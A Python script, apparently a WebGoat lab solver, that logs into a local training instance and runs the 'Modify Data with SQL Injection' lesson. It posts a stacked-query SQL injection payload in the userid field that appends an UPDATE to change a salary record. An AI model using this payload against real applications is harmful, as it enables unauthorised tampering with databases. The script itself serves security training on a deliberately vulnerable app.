"""
"""

import argparse
import re
import json
import sys
import requests
import random


login_url = "http://127.0.0.1:8080/WebGoat/login.mvc"


def test():
#get initial login page for a cookie
    result  = requests.get(login_url)
#get the actual cookie value pair
    login_cookie = requests.utils.dict_from_cookiejar(result.cookies)
#get the security url to authenticate on
    security_url = "http://127.0.0.1:8080/WebGoat/j_spring_security_check"
#craft custom headers for security url
    login_headers = {
'User-Agent' : 'Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0',
'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language' : 'en-US,en;q=0.5',
'Referer': 'http://127.0.0.1:8080/WebGoat/login.mvc',
'Cookie' : 'JSESSIONID='+login_cookie['JSESSIONID'],
'Connection': 'keep-alive',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '29',
'Host': '127.0.0.1:8080'
}

    form_data = {
'username': 'guest',
'password': 'guest'
}
#login
    session = requests.Session()
    login_response  = session.post(security_url, headers=login_headers,data=form_data) 
    #print (login_response.text)
#save the cookie from the successful login
    #session_cookie = requests.utils.dict_from_cookiejar(login_response.cookies)
#this url will make us known
    sub_url = "http://127.0.0.1:8080/WebGoat/attack?Screen=32&menu=5"
    sub_headers = {
'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0',
'Accept': 'application/json, text/plain, */*',
'Accept-Language': 'en-US,en;q=0.5',
'Referer': 'http://127.0.0.1:8080/WebGoat/start.mvc',
'Connection': 'keep-alive',
'Host': '127.0.0.1:8080'
}
    sub_response = session.get(sub_url, headers=sub_headers)
    #print (sub_response.text)

    test_url = "http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc"
    test_headers = {
'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0',
'Accept': 'application/json, text/plain, */*',
'Accept-Language': 'en-US,en;q=0.5',
'Referer': 'http://127.0.0.1:8080/WebGoat/start.mvc',
'Connection': 'keep-alive',
'Host': '127.0.0.1:8080'
}
    test_response = session.get(test_url, headers=test_headers)
    #print (test_response.text)
    spot = test_response.text.find("Modify Data with SQL Injection")
    screenSpot = test_response.text.find("attack?Screen", spot)
    attack_screen = test_response.text[screenSpot:screenSpot+28]
    #print (attack_screen)
#get our attack page
    attack_url = "http://127.0.0.1:8080/WebGoat/"+attack_screen
    attack_headers = {
'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0',
'Accept': 'application/json, text/plain, */*',
'Accept-Language': 'en-US,en;q=0.5',
'Referer': 'http://127.0.0.1:8080/WebGoat/login.mvc',
'Connection': 'keep-alive',
'Host': '127.0.0.1:8080'
}
#get the attack page
    attack_screen = session.get(attack_url,headers=attack_headers)
    #print (attack_screen.text)

#do the attack
    sql_headers = {
'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0',
'Accept': '*/*',
'Accept-Language': 'en-US,en;q=0.5',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With': 'XMLHttpRequest',
'Referer': 'http://127.0.0.1:8080/WebGoat/start.mvc',
'Content-Length': '83',
'Connection': 'keep-alive',
'Pragma': 'no-cache',
'Cache-Control': 'no-cache',
'Host': '127.0.0.1:8080'
}
    salary = random.randint(1,1000)
    salary = str(salary)
    attack_data = {
'userid': "jsmith'; UPDATE salaries SET salary="+salary+" WHERE userid='jsmith"
}
    complete_attack = session.post(attack_url, headers=sql_headers, data=attack_data)

    try:
        if(complete_attack.text.find("Congratulations") != -1):
        	print("Attack Successful")
        else:
        	print("Attack Unsuccessful")
    except Exception as e:
        print (e)


#token = authenticate_user_pass()
test()
